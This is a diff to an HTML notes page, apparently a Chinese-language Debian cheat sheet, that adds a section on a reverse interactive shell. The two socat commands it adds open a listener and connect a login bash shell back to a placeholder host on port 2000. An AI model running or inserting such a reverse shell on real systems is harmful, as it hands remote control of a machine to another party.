@@ -105,5 +105,15 @@ RUN apt update \
     &amp;&amp; rm -rf /var/lib/apt/lists/*
 </pre>
 
+<div id="Debian-反弹交互式 shell"><h3 id="反弹交互式 shell" class="header"><a href="#Debian-反弹交互式 shell">反弹交互式 shell</a></h3></div>
+
+<pre sh>
+socat file:`tty`,raw,echo=0 tcp-listen:2000
+</pre>
+
+<pre sh>
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:DOMAIN-NAME-OR-IP:2000
+</pre>
+
 </body>
 </html>
